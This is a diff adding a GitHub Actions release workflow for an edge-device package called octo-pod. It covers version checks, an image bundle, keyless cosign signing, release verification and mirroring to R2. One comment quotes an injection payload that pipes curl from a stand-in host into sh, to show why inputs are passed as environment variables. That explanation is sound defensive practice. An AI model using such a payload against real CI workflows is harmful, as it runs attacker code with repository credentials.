@@ -1,0 +1,500 @@
+# Build what pods install from, on a tag.
+#
+# A pod does not clone this repository. It installs a package or a release tarball, and
+# takes new ones with `octo-pod upgrade` — which is the whole reason this workflow
+# exists: a site in another country should not need repository credentials, a git
+# client, or the ability to resolve a merge conflict in order to accept a fix.
+#
+# The tag is the source of truth for the version, and VERSION in the tree must agree
+# with it. They disagree exactly once — when someone forgets — and the job fails there
+# rather than shipping an artifact that lies about which version it is.
+#
+# SIGNING IS KEYLESS: cosign
+# exchanges this workflow's OIDC token for a short-lived Fulcio certificate, so there is
+# no private key in a secret for anyone to steal or for us to rotate. What an operator
+# verifies against is the workflow identity, not a key we hold.
+#
+# One signature covers the release: SHA256SUMS is signed, and every artifact is listed
+# in it. A pod then verifies that one signature and hash-checks what it downloaded.
+name: release
+
+on:
+  push:
+    tags: ['octo-pod-v*']        # matches the fleet's <product>-v<version> convention
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Version to build (X.Y.Z), for a dry run without tagging'
+        required: true
+      # The bundle only builds on a tag, which made it the one step first exercised by
+      # the release it is part of — and a tag is the awkward thing to unwind. This
+      # dry-runs it: same credential path, same digests asserted, no release created.
+      build_images:
+        description: 'Also build the image bundle (proves the ghcr read path)'
+        type: boolean
+        default: false
+
+# One release per tag at a time, and never cancel one already running.
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  build:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 120
+    permissions:
+      contents: write        # to create the release and attach artifacts
+      id-token: write        # what makes keyless cosign work; nothing else needs it
+      # To READ the arm images while building the bundle. images.yml pushed them from
+      # this repository, so they are linked to it and GITHUB_TOKEN can read them with
+      # this scope — which means the bundle can be built WITHOUT making the packages
+      # public and without a PAT existing anywhere. Read, never write: this job
+      # publishes releases, and nothing it does should be able to move an image tag.
+      packages: read
+    steps:
+      - uses: actions/checkout@v7
+
+      - name: version — the tag and the tree agree
+        id: v
+        # Context values reach the shell as ENVIRONMENT, never interpolated into the
+        # script body. `${{ inputs.version }}` is attacker-supplied text at the point
+        # the workflow is dispatched, and pasting it into a `run:` block makes it code:
+        # a version of `x'; curl evil | sh; '` would execute in the runner with the
+        # repo token in scope. As an env var it is only ever data.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_VERSION: ${{ inputs.version }}
+        run: |
+          set -euo pipefail
+          tree="$(tr -d '[:space:]' < VERSION)"
+          if [ "$EVENT_NAME" = workflow_dispatch ]; then
+            want="$INPUT_VERSION"
+          else
+            want="${GITHUB_REF_NAME#octo-pod-v}"
+          fi
+          if [ "$tree" != "$want" ]; then
+            echo "::error::VERSION says $tree, the tag says $want. Update VERSION and re-tag."
+            exit 1
+          fi
+          echo "version=$want" >> "$GITHUB_OUTPUT"
+
+      # THE CREDENTIAL LIVES HERE AND NOWHERE ELSE. This job already authenticates to
+      # ghcr — it is where the images were pushed from — so it is the right place to
+      # read them. An edge pod given a PAT stores it base64'd in ~/.docker/config.json:
+      # one recovered box and every private image in the org is readable by whoever has
+      # it. A pod that installs from the bundle holds nothing, and verifies by digest,
+      # which is public information and useless to an attacker. Capture yields the bytes
+      # that box was already running, and no access to anything else.
+      - uses: docker/login-action@v3
+        if: startsWith(github.ref, 'refs/tags/octo-pod-v') || inputs.build_images
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      # --with-images only on a tag: it pulls every pinned image for every architecture
+      # and adds a few hundred MB, which is not worth doing on a dry run. The flag is on
+      # build-release.sh rather than a separate step on purpose — the bundle has to exist
+      # BEFORE SHA256SUMS is written, or it ships unlisted, and an artifact the signature
+      # does not cover is one a pod must refuse.
+      - name: build
+        env:
+          WANT_IMAGES: ${{ inputs.build_images }}
+        run: |
+          set -euo pipefail
+          if [ "${GITHUB_REF}" != "${GITHUB_REF#refs/tags/octo-pod-v}" ] || [ "$WANT_IMAGES" = true ]; then
+            tools/build-release.sh "${{ steps.v.outputs.version }}" --with-images
+          else
+            tools/build-release.sh "${{ steps.v.outputs.version }}"
+          fi
+
+      # The bundle is only useful if what it carries is what the playbooks ask for. A
+      # mismatch here is a bundle that installs cleanly and then cannot start a pod.
+      - name: the bundle carries every pinned digest
+        if: startsWith(github.ref, 'refs/tags/octo-pod-v') || inputs.build_images
+        run: |
+          set -euo pipefail
+          v='${{ steps.v.outputs.version }}'
+          tar -xzf "dist/octo-pod-images-${v}.tar.gz" -C /tmp
+          for var in zenoh_image audit_image udp_ingest_image tcp_ingest_image tcp_connect_image health_pub_image egress_image sapient_image; do
+            ref=$(sed -n "s/^${var}_upstream: *\"\([^\"]*\)\".*/\1/p" \
+                    platform/group_vars/all/10-infrastructure.yml | head -1)
+            [[ "$ref" =~ @sha256:[0-9a-f]{64}$ ]] \
+              || { echo "::error::${var}_upstream is missing a digest pin"; exit 1; }
+            digest="${ref##*@}"
+            grep -q " ${digest}\$" /tmp/images/MAP \
+              || { echo "::error::${var} (${digest}) is not in the bundle MAP"; exit 1; }
+          done
+          echo "all eight pinned digests are present"
+          grep -c . /tmp/images/MAP
+
+      # The artifact is what every pod runs, so what it contains is worth asserting
+      # rather than assuming. test_release.py checks the payload; this checks the two
+      # things that only exist once the .deb is actually built.
+      - name: the package installs where the playbooks expect
+        run: |
+          set -euo pipefail
+          v='${{ steps.v.outputs.version }}'
+          deb="dist/octo-pod_${v}_all.deb"
+          dpkg-deb --info "$deb"
+          # Listed ONCE into a variable, then matched. `dpkg-deb --contents | grep -q`
+          # looks obvious and is a trap under `set -o pipefail`: grep -q exits the
+          # moment it matches, dpkg-deb dies on EPIPE, and the pipeline reports failure
+          # BECAUSE the thing being checked for was found. This step had never once run
+          # to completion — every earlier run failed before reaching it — so it would
+          # have reported "no platform/ in the package" on the first real tag, about a
+          # package that contains it.
+          contents="$(dpkg-deb --contents "$deb")"
+          grep -q ' ./opt/octo-pod/platform/' <<<"$contents" \
+            || { echo "::error::no platform/ in the package"; exit 1; }
+          grep -q ' ./usr/bin/octo-pod' <<<"$contents" \
+            || { echo "::error::the CLI is not on PATH"; exit 1; }
+          grep -q ' ./opt/octo-pod/tools/build-airgap-bundle.sh' <<<"$contents" \
+            || { echo "::error::the image-bundle builder is missing; the seed case needs it"; exit 1; }
+          if grep -q ' ./opt/octo-pod/arms/' <<<"$contents"; then
+            echo "::error::arm source is in the package; pods pull images"; exit 1
+          fi
+          # Exactly the two lines the README and the release notes give an operator, so
+          # the documented sequence is the one that gets proven. dpkg reports the unmet
+          # dependencies; apt-get -f installs them and finishes configuring the package.
+          echo "installing it the documented way, to prove that way works"
+          sudo dpkg -i "./$deb" || true
+          sudo apt-get install -f -y -qq
+          dpkg -s octo-pod | grep -q '^Status: install ok installed' \
+            || { echo "::error::package did not reach installed state"; exit 1; }
+          octo-pod version
+
+      - name: dependencies for the payload tests
+        run: pip install --quiet -r platform/tests/requirements.txt
+
+      - name: release artifact contents
+        run: python3 tests/test_release.py
+        working-directory: platform
+
+      # Tag-only: signing every push burns Sigstore log entries and
+      # produces bundles for refs that will never ship.
+      - name: Install cosign
+        if: startsWith(github.ref, 'refs/tags/octo-pod-v')
+        uses: sigstore/cosign-installer@v3
+        with:
+          cosign-release: 'v2.4.1'
+
+      - name: Sign SHA256SUMS (keyless, sigstore OIDC)
+        if: startsWith(github.ref, 'refs/tags/octo-pod-v')
+        env:
+          COSIGN_YES: "true"
+        run: |
+          set -euo pipefail
+          cd dist
+          # Signing the MANIFEST, not each artifact: one signature, and every hash in
+          # the file inherits it. This is the exact chain bin/octo-pod-upgrade walks.
+          cosign sign-blob --yes --bundle SHA256SUMS.cosign-bundle SHA256SUMS
+          {
+            echo "### cosign keyless signature"
+            echo
+            echo '```'
+            echo "cosign verify-blob \\"
+            echo "  --bundle SHA256SUMS.cosign-bundle \\"
+            echo "  --certificate-identity-regexp '^https://github.com/${GITHUB_REPOSITORY}/' \\"
+            echo "  --certificate-oidc-issuer https://token.actions.githubusercontent.com \\"
+            echo "  SHA256SUMS"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # Prove the chain end to end here, where a failure is cheap. A pod refusing an
+      # unverifiable release in the field is correct but expensive to diagnose.
+      - name: Verify the way a pod will
+        if: startsWith(github.ref, 'refs/tags/octo-pod-v')
+        run: |
+          set -euo pipefail
+          cd dist
+          cosign verify-blob \
+            --bundle SHA256SUMS.cosign-bundle \
+            --certificate-identity-regexp "^https://github.com/${GITHUB_REPOSITORY}/" \
+            --certificate-oidc-issuer https://token.actions.githubusercontent.com \
+            SHA256SUMS
+          sha256sum -c --ignore-missing SHA256SUMS
+
+      - uses: actions/upload-artifact@v7
+        with:
+          name: octo-pod-${{ steps.v.outputs.version }}
+          path: |
+            dist/*.tar.gz
+            dist/*.tar.gz.sha256
+            dist/*.deb
+            dist/*.deb.sha256
+            dist/octo-pod-images-*.tar.gz
+            dist/octo-pod-images-*.tar.gz.sha256
+            dist/SHA256SUMS*
+            dist/index.html
+            dist/LATEST
+
+      # GitHub stays the source of record; the public download surface is a mirror of
+      # it. LATEST ships with the artifacts because `octo-pod upgrade` reads it to
+      # decide there is something newer — it is not maintained by hand on the host.
+      # THE UPLOAD'S EXIT CODE IS NOT THE QUESTION. On 0.1.20 every artifact uploaded
+      # successfully, the action then failed updating asset METADATA on the 272 MB tarball,
+      # logged "Matching asset is present after refresh; continuing…", and exited non-zero
+      # anyway. The release was complete, signed and verifiable; the workflow said it had
+      # failed, and a human had to adjudicate.
+      #
+      # A gate that says no about a good release is worse than no gate. It teaches everyone
+      # to read red as "probably fine", which is the habit that lets a real failure through —
+      # the same reason a flaky test is a defect rather than an annoyance.
+      #
+      # So the upload is allowed to be flaky and the step AFTER it decides, by asking the
+      # published release what it actually contains. Prove function, not process.
+      - name: publish
+        id: publish
+        continue-on-error: true
+        if: startsWith(github.ref, 'refs/tags/octo-pod-v')
+        uses: softprops/action-gh-release@v3
+        with:
+          files: |
+            dist/*.tar.gz
+            dist/*.tar.gz.sha256
+            dist/*.deb
+            dist/*.deb.sha256
+            dist/octo-pod-images-*.tar.gz
+            dist/octo-pod-images-*.tar.gz.sha256
+            dist/SHA256SUMS*
+            dist/index.html
+            dist/LATEST
+          body: |
+            ## Verify first
+
+                cosign verify-blob \
+                  --bundle SHA256SUMS.cosign-bundle \
+                  --certificate-identity-regexp '^https://github.com/${{ github.repository }}/' \
+                  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
+                  SHA256SUMS
+                sha256sum -c --ignore-missing SHA256SUMS
+
+            ## Install on a pod
+
+                sudo mkdir -p /opt/octo-pod-${{ steps.v.outputs.version }}
+                sudo tar -xzf octo-pod-${{ steps.v.outputs.version }}.tar.gz \
+                  -C /opt/octo-pod-${{ steps.v.outputs.version }}
+                sudo ln -sfn /opt/octo-pod-${{ steps.v.outputs.version }} /opt/octo-pod
+                sudo /opt/octo-pod/bin/octo-pod bootstrap
+
+            Or install the `.deb` **by file** — there is no `octo-pod` apt repository, so
+            nothing below goes looking for one. The second line installs the three
+            dependencies the first will report as missing:
+
+                sudo dpkg -i ./octo-pod_${{ steps.v.outputs.version }}_all.deb
+                sudo apt-get install -f -y
+
+            After that, `sudo octo-pod upgrade` handles every later version and verifies
+            this same signature itself.
+
+            A pod's identity in /etc/octo-pod is not touched by installing or upgrading.
+
+      # REPAIR THE KNOWN FLAKE BEFORE JUDGING IT. softprops/action-gh-release creates the
+      # release as a DRAFT, uploads into it, then flips it to published as its last act.
+      # That flip runs on the same asset-metadata call that made the upload advisory, so a
+      # release with every artifact present can still be invisible to consumers. It has now
+      # happened to 0.2.2 and 0.3.0.
+      #
+      # This is a runtime fault of the uploader, not a decision anyone needs to read: the
+      # tag was pushed, the artifacts are built and verified below, and a draft is simply
+      # not the state that was asked for. So it is repaired here, and the gate that follows
+      # still judges the result independently. Reporting a fault a machine can fix, and
+      # leaving it for someone to notice in the morning, is how 0.2.2 shipped as a draft
+      # while install-to-pod.sh quietly served 0.2.1.
+      - name: publish — the uploader leaves it a draft when its last call flakes
+        if: startsWith(github.ref, 'refs/tags/octo-pod-v')
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -euo pipefail
+          v='${{ steps.v.outputs.version }}'
+          tag="octo-pod-v${v}"
+          if [ "$(gh release view "$tag" --repo "$GITHUB_REPOSITORY" --json isDraft --jq .isDraft)" = "true" ]; then
+            echo "::warning::${tag} was left a draft by the uploader; publishing it"
+            gh release edit "$tag" --repo "$GITHUB_REPOSITORY" --draft=false --latest
+          fi
+          # `latest` is assigned by publish time, not by version, so a release published
+          # out of order silently takes it from a newer one.
+          if [ "$(gh release view --repo "$GITHUB_REPOSITORY" --json tagName --jq .tagName 2>/dev/null || true)" != "$tag" ]; then
+            echo "::warning::latest did not resolve to ${tag}; setting it"
+            gh release edit "$tag" --repo "$GITHUB_REPOSITORY" --latest
+          fi
+
+      # THE ACTUAL RELEASE GATE. Everything above produced artifacts and pushed them; this
+      # asks the published release what it now contains, and fails only on an answer that is
+      # wrong. Verified the way a consumer verifies it — downloaded back out of the release,
+      # signature checked against the workflow identity, hashes checked against the signed
+      # manifest — rather than by trusting the upload we just performed.
+      #
+      # The distinction that matters: a missing .sha256 SIDECAR is not a broken release,
+      # because SHA256SUMS is the signed manifest and covers every artifact by name. A missing
+      # tarball, an unsigned manifest or a hash that does not match IS. Grading those
+      # differently is the whole point — 0.1.20 lost a sidecar to a flaky metadata update and
+      # was otherwise perfect, and the old gate could not tell that apart from a corrupt release.
+      - name: the release is complete and verifiable
+        if: startsWith(github.ref, 'refs/tags/octo-pod-v')
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -euo pipefail
+          v="${GITHUB_REF_NAME#octo-pod-v}"
+          tmp="$(mktemp -d)"
+
+          # REQUIRED: without any one of these a pod cannot install, or cannot verify.
+          required="octo-pod-${v}.tar.gz octo-pod_${v}_all.deb SHA256SUMS SHA256SUMS.cosign-bundle LATEST"
+          # ADVISORY: convenience copies of a hash that the signed SHA256SUMS already carries.
+          advisory="octo-pod-${v}.tar.gz.sha256 octo-pod_${v}_all.deb.sha256 index.html octo-pod-images-${v}.tar.gz.sha256"
+
+          have=""
+          for try in 1 2 3; do
+            have="$(gh release view "octo-pod-v${v}" --repo "$GITHUB_REPOSITORY" \
+                      --json assets --jq '.assets[].name' 2>/dev/null || true)"
+            [ -n "$have" ] && break
+            sleep 10
+          done
+          if [ -z "$have" ]; then
+            echo "::error::no release published for octo-pod-v${v}"
+            exit 1
+          fi
+
+          missing=""
+          for f in $required; do
+            printf '%s\n' "$have" | grep -qx "$f" || missing="$missing $f"
+          done
+          if [ -n "$missing" ]; then
+            echo "::error::release octo-pod-v${v} is missing required artifacts:$missing"
+            exit 1
+          fi
+          for f in $advisory; do
+            printf '%s\n' "$have" | grep -qx "$f" \
+              || echo "::warning::$f is absent — a convenience copy of a hash the signed SHA256SUMS already carries. The release is installable and verifiable without it."
+          done
+
+          # If the bundle was built it must be published: a pod told to install airgapped
+          # cannot recover from its absence.
+          if [ -f "dist/octo-pod-images-${v}.tar.gz" ]; then
+            printf '%s\n' "$have" | grep -qx "octo-pod-images-${v}.tar.gz" || {
+              echo "::error::the image bundle was built but is not in the release"
+              exit 1
+            }
+          fi
+
+          # PUBLISHED, NOT MERELY CREATED. softprops/action-gh-release creates the release as a
+          # DRAFT, uploads into it, then flips it to published at the end. When it fails after
+          # the uploads, which it does on the same flaky asset-metadata call that made the
+          # publish step advisory, the release keeps every artifact and stays a draft.
+          #
+          # A draft is invisible to consumers. `gh release view` with no tag skips it, so
+          # install-to-pod.sh resolved 'latest' to the PREVIOUS version and installed that,
+          # silently, while the tag and the repo both said otherwise. This step passed, because
+          # it was checking contents rather than publication: every artifact was present.
+          draft=$(gh release view "octo-pod-v${v}" --repo "$GITHUB_REPOSITORY" --json isDraft --jq .isDraft)
+          if [ "$draft" != "false" ]; then
+            echo "::error::octo-pod-v${v} is still a DRAFT. Every artifact may be present, but consumers cannot see it and latest resolves to the previous release. Publish it: gh release edit octo-pod-v${v} --draft=false --latest"
+            exit 1
+          fi
+
+          # AND IT MUST BE WHAT 'latest' RESOLVES TO. GitHub assigns that flag by publish time,
+          # not by version, so publishing an older draft afterwards silently takes it.
+          latest=$(gh release view --repo "$GITHUB_REPOSITORY" --json tagName --jq .tagName 2>/dev/null || true)
+          if [ "$latest" != "octo-pod-v${v}" ]; then
+            echo "::error::latest resolves to ${latest:-nothing}, not octo-pod-v${v}. install-to-pod.sh with no --version would install the wrong one. Fix: gh release edit octo-pod-v${v} --latest"
+            exit 1
+          fi
+
+          # VERIFIED AS A CONSUMER DOES — from the published release, not from dist/.
+          gh release download "octo-pod-v${v}" --repo "$GITHUB_REPOSITORY" -D "$tmp" \
+             -p SHA256SUMS -p SHA256SUMS.cosign-bundle \
+             -p "octo-pod-${v}.tar.gz" -p "octo-pod_${v}_all.deb"
+          ( cd "$tmp" && cosign verify-blob --bundle SHA256SUMS.cosign-bundle \
+              --certificate-identity-regexp "^https://github.com/$GITHUB_REPOSITORY/" \
+              --certificate-oidc-issuer https://token.actions.githubusercontent.com SHA256SUMS )
+          ( cd "$tmp" && sha256sum -c --ignore-missing SHA256SUMS )
+
+          {
+            echo "### Release verified"
+            echo
+            echo "\`octo-pod-v${v}\` — every required artifact present, signature valid, hashes match."
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # MIRROR TO THE PUBLIC SURFACE, from here, on every tag. This was a printed
+      # instruction telling the releaser to run rclone by hand — and the octo-pod prefix
+      # sat empty from the day it was written, because a step that depends on someone
+      # remembering is a step that does not happen. Pods point octo_repo_url at this
+      # surface, so an empty mirror is `octo-pod upgrade` not working at all.
+      #
+      # PER-VERSION DIRECTORIES, not a flat drop. SHA256SUMS describes only the release
+      # that produced it, so one shared copy at the root can only ever describe the newest
+      # — `upgrade --to <older>` would fail "not listed in the signed manifest" against a
+      # tarball sitting right there, and re-syncing an old release would roll LATEST
+      # backwards for the whole fleet. LATEST is the only thing written to the root, and
+      # it is written LAST, so a partial upload never advertises a version whose files
+      # are not all up yet.
+      #
+      # SKIPPED, NOT FAILED, when the credentials are absent: a fork or a dry run should
+      # still cut a release. The summary says which happened either way, because a mirror
+      # that silently did not publish is the failure this step exists to end.
+      - name: mirror to the release bucket
+        if: startsWith(github.ref, 'refs/tags/octo-pod-v')
+        env:
+          AWS_ACCESS_KEY_ID: ${{ secrets.R2_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.R2_SECRET_ACCESS_KEY }}
+          R2_ACCOUNT_ID: ${{ secrets.R2_ACCOUNT_ID }}
+          R2_BUCKET: ${{ vars.R2_BUCKET }}
+          MIRROR_URL: ${{ vars.RELEASE_MIRROR_URL }}
+          R2_PREFIX: ${{ vars.R2_PREFIX || 'octo-pod' }}
+        run: |
+          set -euo pipefail
+          v="${GITHUB_REF_NAME#octo-pod-v}"
+
+          if [ -z "${AWS_ACCESS_KEY_ID:-}" ] || [ -z "${R2_ACCOUNT_ID:-}" ] \
+             || [ -z "${R2_BUCKET:-}" ] || [ -z "${MIRROR_URL:-}" ]; then
+            {
+              echo "### Mirror: SKIPPED"
+              echo
+              echo "No mirror is configured, so $v is published on the GitHub release only."
+              echo
+              echo "To mirror every tag, add three repository secrets,"
+              echo "\`R2_ACCOUNT_ID\`, \`R2_ACCESS_KEY_ID\`, \`R2_SECRET_ACCESS_KEY\`,"
+              echo "and two variables: \`R2_BUCKET\` and \`RELEASE_MIRROR_URL\`, the public base URL."
+              echo "(Cloudflare → R2 → API tokens → **Account** token, Object Read & Write,"
+              echo "scoped to the mirror bucket)."
+            } >> "$GITHUB_STEP_SUMMARY"
+            exit 0
+          fi
+
+          EP="https://${R2_ACCOUNT_ID}.r2.cloudflarestorage.com"
+          DEST="s3://${R2_BUCKET}/${R2_PREFIX}/${v}/"
+
+          # The version directory first, LATEST only once it is all there.
+          aws s3 cp "dist/octo-pod-${v}.tar.gz"                "$DEST" --endpoint-url "$EP"
+          aws s3 cp "dist/octo-pod_${v}_all.deb"               "$DEST" --endpoint-url "$EP"
+          aws s3 cp "dist/SHA256SUMS"                          "$DEST" --endpoint-url "$EP"
+          aws s3 cp "dist/SHA256SUMS.cosign-bundle"            "$DEST" --endpoint-url "$EP"
+          [ -f "dist/octo-pod-images-${v}.tar.gz" ] \
+            && aws s3 cp "dist/octo-pod-images-${v}.tar.gz"    "$DEST" --endpoint-url "$EP"
+          [ -f "dist/index.html" ] \
+            && aws s3 cp "dist/index.html" "s3://${R2_BUCKET}/${R2_PREFIX}/index.html" --endpoint-url "$EP"
+
+          # LAST. Everything above is fetched BY the version LATEST names, so publishing
+          # it earlier would point every pod at a directory that is still uploading.
+          aws s3 cp "dist/LATEST" "s3://${R2_BUCKET}/${R2_PREFIX}/LATEST" --endpoint-url "$EP"
+
+          # Proven from the outside, over the public URL a pod actually uses — not from
+          # the API we just wrote through, which would only confirm our own request.
+          base="${MIRROR_URL%/}/${R2_PREFIX}"
+          got="$(curl -fsSL --max-time 30 "$base/LATEST" | tr -d '[:space:]')"
+          [ "$got" = "$v" ] || { echo "::error::$base/LATEST reads '$got', expected '$v'"; exit 1; }
+          curl -fsS -o /dev/null --max-time 60 "$base/$v/octo-pod-$v.tar.gz" \
+            || { echo "::error::$base/$v/octo-pod-$v.tar.gz is not readable"; exit 1; }
+
+          {
+            echo "### Mirror: published"
+            echo
+            echo "\`$base/$v/\` — tarball, deb, SHA256SUMS + signature"
+            echo "\`$base/LATEST\` → \`$v\` (verified over the public URL)"
+            echo
+            echo "Pods with \`octo_repo_url: $base\` will take this on \`octo-pod upgrade\`."
+          } >> "$GITHUB_STEP_SUMMARY"
